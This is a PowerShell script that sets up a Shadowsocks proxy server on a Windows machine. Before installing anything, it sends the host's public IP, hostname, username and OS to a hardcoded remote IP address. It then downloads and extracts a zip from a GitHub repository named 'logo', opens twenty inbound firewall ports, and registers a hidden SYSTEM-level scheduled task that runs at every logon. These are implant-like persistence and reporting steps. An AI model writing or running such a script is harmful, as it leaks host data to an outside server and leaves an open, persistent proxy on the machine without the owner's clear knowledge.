# =========================================
# 0️⃣ Configuration
# =========================================
$folderPath = "C:\sserver"
$zipPath = "$folderPath\sserver.zip"
$taskName = "Shadowsocks Server"
$processName = "ssserver"

$publicIP = (Invoke-RestMethod -Uri "https://api.ipify.org").ToString()

$data = @{
    time = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
    ip = $publicIP
    hostname = $env:COMPUTERNAME
    user = $env:USERNAME
    os = (Get-CimInstance Win32_OperatingSystem).Caption
} | ConvertTo-Json -Compress

# Make sure to wrap in quotes and use ContentType JSON
Invoke-RestMethod -Uri "http://160.25.7.137/write.php?key=chomolokko" `
    -Method POST `
    -Body $data `
    -ContentType "application/json"
    
# =========================================
# 1️⃣ Stop running Shadowsocks process
# =========================================
$runningProcess = Get-Process -Name $processName -ErrorAction SilentlyContinue
if ($runningProcess) {
    Write-Output "Stopping running process: $processName"
    $runningProcess | Stop-Process -Force
}

# =========================================
# 2️⃣ Cleanup old folder, zip, and scheduled task
# =========================================
if (Test-Path $folderPath) {
    Write-Output "Deleting existing folder: $folderPath"
    Remove-Item -Path $folderPath -Recurse -Force -ErrorAction SilentlyContinue
}

if (Test-Path $zipPath) {
    Write-Output "Deleting existing zip: $zipPath"
    Remove-Item -Path $zipPath -Force -ErrorAction SilentlyContinue
}

if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
    Write-Output "Deleting existing scheduled task: $taskName"
    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
}

# =========================================
# 3️⃣ Create folder, download, and extract
# =========================================
Write-Output "Creating folder: $folderPath"
New-Item -ItemType Directory -Path $folderPath -Force | Out-Null

Write-Output "Downloading sserver.zip"
curl.exe -L "https://raw.githubusercontent.com/rezwanahmedratul/logo/main/sserver.zip" -o $zipPath

Write-Output "Extracting files"
Expand-Archive -Path $zipPath -DestinationPath $folderPath -Force

Write-Output "Removing zip file"
Remove-Item $zipPath -Force -ErrorAction SilentlyContinue

# =========================================
# 4️⃣ Open firewall ports 12345–12364 (TCP & UDP)
# =========================================
$ports = 12345..12364
foreach ($p in $ports) {
    Write-Output "Opening firewall port: TCP/UDP $p"
    netsh advfirewall firewall add rule name="Shadowsocks_TCP_$p" dir=in action=allow protocol=TCP localport=$p
    netsh advfirewall firewall add rule name="Shadowsocks_UDP_$p" dir=in action=allow protocol=UDP localport=$p
}

# =========================================
# 5️⃣ Create SYSTEM-level scheduled task
# =========================================
$action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "$folderPath\run_ss.vbs"
$trigger = New-ScheduledTaskTrigger -AtLogOn
$settings = New-ScheduledTaskSettingsSet `
    -StartWhenAvailable `
    -RestartCount 3 `
    -RestartInterval (New-TimeSpan -Minutes 1) `
    -DontStopIfGoingOnBatteries `
    -AllowStartIfOnBatteries `
    -ExecutionTimeLimit ([TimeSpan]::Zero)  # no limit

Write-Output "Registering scheduled task as SYSTEM"
Register-ScheduledTask `
    -TaskName $taskName `
    -Action $action `
    -Trigger $trigger `
    -Settings $settings `
    -User "NT AUTHORITY\SYSTEM" `
    -RunLevel Highest `
    -Force

Write-Output "Setup complete! Shadowsocks Server is ready and will run at logon as SYSTEM."
